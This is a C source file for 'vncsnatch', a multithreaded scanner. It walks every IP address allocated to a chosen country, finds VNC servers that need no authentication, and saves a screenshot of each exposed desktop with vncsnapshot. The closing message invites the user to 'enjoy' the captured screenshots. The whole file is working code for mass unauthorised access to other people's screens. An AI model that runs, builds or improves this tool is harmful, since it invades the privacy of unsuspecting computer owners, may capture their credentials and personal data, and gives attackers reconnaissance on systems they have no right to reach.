#include "color_defs.h"
#include "file_utils.h"
#include "misc_utils.h"
#include "network_utils.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <readline/history.h>
#include <readline/readline.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#define TCP_PORT 5900

// ANSI color codes

/**
 * Prints the program banner to the console.
 *
 * @return Always returns 0.
 */
int print_banner() {
  printf(COLOR_CYAN
         "\n"
         "██╗   ██╗███╗   ██╗ ██████╗███████╗███╗   ██╗ █████╗ ████████╗ "
         "██████╗██╗  ██╗\n"
         "██║   ██║████╗  ██║██╔════╝██╔════╝████╗  "
         "██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║\n"
         "██║   ██║██╔██╗ ██║██║     ███████╗██╔██╗ ██║███████║   ██║   ██║    "
         " ███████║\n"
         "╚██╗ ██╔╝██║╚██╗██║██║     ╚════██║██║╚██╗██║██╔══██║   ██║   ██║    "
         " ██╔══██║\n"
         " ╚████╔╝ ██║ ╚████║╚██████╗███████║██║ ╚████║██║  ██║   ██║   "
         "╚██████╗██║  ██║\n"
         "  ╚═══╝  ╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    "
         "╚═════╝╚═╝  ╚═╝\n"
         "                                                                    "
         " " COLOR_MAGENTA "             by  \n\n" COLOR_RESET);
  return 0;
}

/**
 * Checks if a given command is available in the system's PATH.
 *
 * @param command The name of the command to check.
 * @return 1 if the command is found in the PATH, 0 otherwise.
 */
int is_command_in_path(const char *command) {
  char *path = getenv("PATH");
  if (path == NULL) {
    return 0;
  }

  char *path_dup = strdup(path);
  char *dir = strtok(path_dup, ":");
  while (dir != NULL) {
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s/%s", dir, command);
    if (access(full_path, X_OK) == 0) {
      free(path_dup);
      return 1;
    }
    dir = strtok(NULL, ":");
  }
  free(path_dup);
  return 0;
}

static int run_vncsnapshot(const char *ip_addr);

typedef struct {
  uint32_t start;
  uint32_t end;
} ip_range_t;

typedef struct {
  ip_range_t *ranges;
  size_t range_count;
  size_t range_index;
  uint32_t current_ip;
  pthread_mutex_t range_mutex;
  uint64_t total_ips;
  uint64_t scanned_ips;
  uint64_t online_hosts;
  uint64_t vnc_found;
  uint64_t vnc_noauth;
  uint64_t screenshots;
  pthread_mutex_t stats_mutex;
  pthread_mutex_t print_mutex;
  struct timeval last_print;
} scan_context_t;

static int load_country_ranges(const char *file_location,
                               const char *country_code,
                               ip_range_t **ranges_out,
                               size_t *range_count_out,
                               uint64_t *total_ips_out) {
  FILE *file = fopen(file_location, "r");
  char line[1024];
  ip_range_t *ranges = NULL;
  size_t range_count = 0;
  size_t range_capacity = 0;
  uint64_t total_ips = 0;

  if (file == NULL) {
    perror(COLOR_RED "Failed to open CSV file" COLOR_RESET);
    return -1;
  }

  while (fgets(line, sizeof(line), file) != NULL) {
    char start_ip_str[20], end_ip_str[20], csv_country_code[3],
        country_name[50];
    int parsed = sscanf(line, "\"%19[^\"]\",\"%19[^\"]\",\"%2[^\"]\",\"%49[^\"]\"",
                        start_ip_str, end_ip_str, csv_country_code,
                        country_name);
    if (parsed != 4) {
      continue;
    }
    if (strcmp(csv_country_code, country_code) != 0) {
      continue;
    }

    uint32_t start_ip = (uint32_t)strtoul(start_ip_str, NULL, 10);
    uint32_t end_ip = (uint32_t)strtoul(end_ip_str, NULL, 10);
    if (start_ip > end_ip) {
      continue;
    }

    if (range_count == range_capacity) {
      size_t new_capacity = range_capacity == 0 ? 64 : range_capacity * 2;
      ip_range_t *new_ranges =
          realloc(ranges, new_capacity * sizeof(*ranges));
      if (!new_ranges) {
        free(ranges);
        fclose(file);
        return -1;
      }
      ranges = new_ranges;
      range_capacity = new_capacity;
    }
    ranges[range_count].start = start_ip;
    ranges[range_count].end = end_ip;
    range_count++;
    total_ips += (uint64_t)end_ip - (uint64_t)start_ip + 1;
  }

  fclose(file);

  *ranges_out = ranges;
  *range_count_out = range_count;
  *total_ips_out = total_ips;
  return 0;
}

static int get_worker_count(void) {
  long cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
  int workers = cpu_count > 0 ? (int)cpu_count * 2 : 4;

  if (workers < 2) {
    workers = 2;
  }
  if (workers > 64) {
    workers = 64;
  }
  return workers;
}

static int get_next_ip(scan_context_t *ctx, uint32_t *ip_out) {
  int has_ip = 0;

  pthread_mutex_lock(&ctx->range_mutex);
  if (ctx->range_index < ctx->range_count) {
    *ip_out = ctx->current_ip;
    if (ctx->current_ip == ctx->ranges[ctx->range_index].end) {
      ctx->range_index++;
      if (ctx->range_index < ctx->range_count) {
        ctx->current_ip = ctx->ranges[ctx->range_index].start;
      }
    } else {
      ctx->current_ip++;
    }
    has_ip = 1;
  }
  pthread_mutex_unlock(&ctx->range_mutex);

  return has_ip;
}

static void update_progress(scan_context_t *ctx, int force) {
  struct timeval now;
  gettimeofday(&now, NULL);

  pthread_mutex_lock(&ctx->print_mutex);
  long elapsed_ms = (now.tv_sec - ctx->last_print.tv_sec) * 1000L +
                    (now.tv_usec - ctx->last_print.tv_usec) / 1000L;
  if (!force && elapsed_ms >= 0 && elapsed_ms < 200) {
    pthread_mutex_unlock(&ctx->print_mutex);
    return;
  }

  pthread_mutex_lock(&ctx->stats_mutex);
  uint64_t scanned = ctx->scanned_ips;
  uint64_t total = ctx->total_ips;
  uint64_t online = ctx->online_hosts;
  uint64_t vnc_found = ctx->vnc_found;
  uint64_t vnc_noauth = ctx->vnc_noauth;
  uint64_t shots = ctx->screenshots;
  pthread_mutex_unlock(&ctx->stats_mutex);

  double pct = total ? (double)scanned * 100.0 / (double)total : 0.0;
  printf("\r\033[2KProgress: %llu/%llu (%.1f%%) online:%llu vnc:%llu noauth:%llu shots:%llu",
         (unsigned long long)scanned,
         (unsigned long long)total,
         pct,
         (unsigned long long)online,
         (unsigned long long)vnc_found,
         (unsigned long long)vnc_noauth,
         (unsigned long long)shots);
  fflush(stdout);
  ctx->last_print = now;
  pthread_mutex_unlock(&ctx->print_mutex);
}

static void *scan_worker(void *arg) {
  scan_context_t *ctx = arg;
  uint32_t ip;

  while (get_next_ip(ctx, &ip)) {
    char ip_addr[INET_ADDRSTRLEN];
    struct in_addr ip_addr_struct;
    ip_addr_struct.s_addr = htonl(ip);

    if (!inet_ntop(AF_INET, &ip_addr_struct, ip_addr, sizeof(ip_addr))) {
      pthread_mutex_lock(&ctx->stats_mutex);
      ctx->scanned_ips++;
      pthread_mutex_unlock(&ctx->stats_mutex);
      update_progress(ctx, 0);
      continue;
    }

    int online = is_ip_up(ip_addr);
    int vnc_state = -1;
    int took_shot = 0;

    if (online) {
      vnc_state = get_security(ip_addr, false);
      if (vnc_state == 1 && run_vncsnapshot(ip_addr) == 0) {
        took_shot = 1;
      }
    }

    pthread_mutex_lock(&ctx->stats_mutex);
    ctx->scanned_ips++;
    if (online) {
      ctx->online_hosts++;
    }
    if (vnc_state >= 0) {
      ctx->vnc_found++;
    }
    if (vnc_state == 1) {
      ctx->vnc_noauth++;
    }
    if (took_shot) {
      ctx->screenshots++;
    }
    pthread_mutex_unlock(&ctx->stats_mutex);

    update_progress(ctx, 0);
  }

  return NULL;
}

/**
 * Parses the CSV file and checks IP addresses within specified ranges.
 *
 * @param file_location The path to the CSV file.
 * @param country_code The country code to filter IP ranges.
 * @return The number of screenshots taken.
 */
int parse_and_check_ips(const char *file_location, const char *country_code) {
  ip_range_t *ranges = NULL;
  size_t range_count = 0;
  uint64_t total_ips = 0;

  if (load_country_ranges(file_location, country_code, &ranges, &range_count,
                          &total_ips) != 0) {
    return 0;
  }

  if (range_count == 0) {
    printf(COLOR_YELLOW "No ranges found for country code %s.\n" COLOR_RESET,
           country_code);
    free(ranges);
    return 0;
  }

  printf("Country %s: %zu ranges totaling %llu IPs\n",
         country_code,
         range_count,
         (unsigned long long)total_ips);

  scan_context_t ctx;
  memset(&ctx, 0, sizeof(ctx));
  ctx.ranges = ranges;
  ctx.range_count = range_count;
  ctx.range_index = 0;
  ctx.current_ip = ranges[0].start;
  ctx.total_ips = total_ips;
  pthread_mutex_init(&ctx.range_mutex, NULL);
  pthread_mutex_init(&ctx.stats_mutex, NULL);
  pthread_mutex_init(&ctx.print_mutex, NULL);
  gettimeofday(&ctx.last_print, NULL);

  int worker_count = get_worker_count();
  printf("Using %d worker threads\n", worker_count);
  update_progress(&ctx, 1);

  pthread_t *threads = calloc((size_t)worker_count, sizeof(*threads));
  if (!threads) {
    free(ranges);
    return 0;
  }

  int started_workers = 0;
  for (int i = 0; i < worker_count; i++) {
    if (pthread_create(&threads[i], NULL, scan_worker, &ctx) != 0) {
      break;
    }
    started_workers++;
  }
  for (int i = 0; i < started_workers; i++) {
    pthread_join(threads[i], NULL);
  }

  update_progress(&ctx, 1);
  printf("\n");
  printf("Finished checking %llu addresses, VNCs found %llu (no auth %llu), screenshots %llu\n",
         (unsigned long long)ctx.scanned_ips,
         (unsigned long long)ctx.vnc_found,
         (unsigned long long)ctx.vnc_noauth,
         (unsigned long long)ctx.screenshots);

  pthread_mutex_destroy(&ctx.range_mutex);
  pthread_mutex_destroy(&ctx.stats_mutex);
  pthread_mutex_destroy(&ctx.print_mutex);
  free(threads);
  free(ranges);
  return (int)ctx.screenshots;
}

char *file_location = NULL;
char *country_code = NULL;
static int run_vncsnapshot(const char *ip_addr) {
  char target[32];
  char output[32];
  char *argv[] = {"vncsnapshot", "-allowblank", target, output, NULL};
  const int timeout_sec = 60;
  time_t start_time = time(NULL);

  if (snprintf(target, sizeof(target), "%s:0", ip_addr) >= (int)sizeof(target)) {
    return -1;
  }
  if (snprintf(output, sizeof(output), "%s.jpg", ip_addr) >= (int)sizeof(output)) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    return -1;
  }
  if (pid == 0) {
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
      dup2(devnull, STDOUT_FILENO);
      dup2(devnull, STDERR_FILENO);
      if (devnull > STDERR_FILENO) {
        close(devnull);
      }
    }
    execvp(argv[0], argv);
    _exit(127);
  }

  for (;;) {
    int status = 0;
    pid_t wait_result = waitpid(pid, &status, WNOHANG);
    if (wait_result == pid) {
      if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
      }
      return -1;
    }
    if (wait_result == 0) {
      if (time(NULL) - start_time >= timeout_sec) {
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        return -1;
      }
      usleep(100000);
      continue;
    }
    if (wait_result < 0 && errno == EINTR) {
      continue;
    }
    return -1;
  }
}

/**
 * Signal handler for cleaning up resources on SIGINT.
 *
 * @param signum The signal number.
 */
void handle_sigint(int signum) {
  fprintf(stderr,
          COLOR_RED "\nInterrupt received. Cleaning up...\n" COLOR_RESET);
  if (file_location) {
    rl_clear_history();
    free(file_location);
  }
  if (country_code) {
    free(country_code);
  }
  exit(1);
}

/**
 * Main function to execute the program.
 *
 * @return Exit status of the program.
 */
int main() {
  // handle ctrl-c
  signal(SIGINT, handle_sigint);
  // print ansi banner
  //
  print_banner();

  if (!has_required_capabilities()) {
    fprintf(
        stderr, COLOR_RED
        "Warning!:\nThe program does not have the required "
        "capabilities or is not run by root.\n To set capabilities use:\n - "
        "sudo setcap cap_net_admin,cap_net_raw=eip vncsnatch\n\n" COLOR_RESET);
    fprintf(stderr, COLOR_RED "Without this, the IP check will be slow as we "
                              "cannot just ping it.\n\n" COLOR_RESET);
  }
  country_code = (char *)malloc(5 * sizeof(char));

  if (!is_command_in_path("vncsnapshot")) {
    fprintf(stderr, COLOR_RED
            "Error: vncsnapshot is not in the PATH. Please install it "
            "and ensure it is accessible.\n" COLOR_RESET);
    free(country_code);
    return 1;
  }
  printf("Please enter the country code to filter by (e.g., AU): ");
  if (fgets(country_code, 3, stdin) == NULL) {
    fprintf(stderr, COLOR_RED "Error reading country code.\n" COLOR_RESET);
    free(country_code);
    return 1;
  }
  country_code[strcspn(country_code, "\n")] = '\0';
  printf("Please enter full file path to the CSV file from "
         "IP2Location.com.\nIt can be downloaded from "
         "https://download.ip2location.com/lite/"
         "\n\nFull path: ");
  file_location = readline("==>");
  if (file_location == NULL || strlen(file_location) == 0) {
    fprintf(stderr, COLOR_RED "Error reading user input.\n" COLOR_RESET);
    if (file_location)
      free(file_location);
    if (country_code)
      free(country_code);
    return 1;
  }

  char *cleaned_file_location = clean_file_location(file_location);
  if (!cleaned_file_location) {
    fprintf(stderr, COLOR_RED "Error cleaning file location.\n" COLOR_RESET);
    if (file_location)
      free(file_location);
    if (country_code)
      free(country_code);
    return 1;
  }

  int num_shots = parse_and_check_ips(cleaned_file_location, country_code);
  printf(COLOR_GREEN
         "\nAll done. Enjoy %d new screenshots in this folder\n" COLOR_RESET,
         num_shots);

  if (file_location)
    free(file_location);
  if (cleaned_file_location)
    free(cleaned_file_location);
  if (country_code)
    free(country_code);
  return 0;
}
